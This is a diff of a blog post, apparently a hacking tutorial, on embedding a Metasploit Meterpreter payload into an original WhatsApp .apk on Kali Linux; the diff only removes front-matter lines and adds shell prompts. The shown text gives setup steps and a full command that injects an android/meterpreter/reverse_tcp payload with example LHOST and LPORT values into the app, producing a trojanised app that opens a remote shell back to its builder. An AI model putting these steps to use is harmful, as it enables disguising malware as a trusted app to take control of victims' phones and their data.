@@ -1,14 +1,11 @@
 ---
-layout: post
 date: 'Sat Dec 12 2015 02:30:19 GMT+0530 (India Standard Time)'
-slug: embed-metasploit-payload-in-apk-easily
 title: Embed a Metasploit Payload in an Original .apk File | Part 1 - The Easy Way
 tags:
   - Android
   - Hacking
   - Metasploit
   - Kali Linux
-published: true
 ---
 
 Hi Fellas! I’m sure most of you, or at least those who have set a foot in the kingdom of hacking, have heard of Metasploit. Don’t be disappointed if you haven’t, because you’re in the right track.
@@ -31,7 +28,7 @@ Just to be clear,  In this tutorial the operating system used is Kali Linux, wh
 
 To install the required libraries, enter this command at the console:
 ```console
-apt-get install lib32stdc++6 lib32ncurses5 lib32z1
+$ sudo apt-get install lib32stdc++6 lib32ncurses5 lib32z1
 ```
 
 And to get the latest version of ApkTool, head over to [this site](http://ibotpeaches.github.io/Apktool/install/) and follow the installation instructions.
@@ -49,7 +46,7 @@ Download the Ruby script from [this link](https://github.com/SkullTech/apk-paylo
 
 Open a terminal, and type the following command:
 ```console
-ruby apk-embed-payload.rb WhatsApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895
+$ ruby apk-embed-payload.rb WhatsApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895
 ```
 
 In this example I’ve used `192.168.0.104` as the Local IP address, i.e. your IP address and `4895` as the port on your Computer through which the Meterpreter payload will connect back to you. Make sure to change it to the appropriate values, especially the IP, the LPORT can be set to any reasonable port no.
